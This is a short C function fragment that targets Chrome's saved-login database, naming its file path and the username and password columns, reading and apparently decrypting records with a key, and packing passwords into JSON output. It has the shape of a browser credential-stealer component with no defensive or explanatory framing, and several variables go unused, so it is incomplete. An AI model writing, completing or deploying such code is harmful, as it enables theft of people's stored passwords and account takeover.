void inspect(void *h, void *dst, int n, void *key) {
    const char *store = "Google/Chrome/User Data/Default/Login Data";
    const char *user = "username_value";
    const char *secret = "password_value";
    ReadFile(h, dst, n, 0, 0);
    process_record(key, dst, n);
    append_json(dst, ",\"password\":");
}
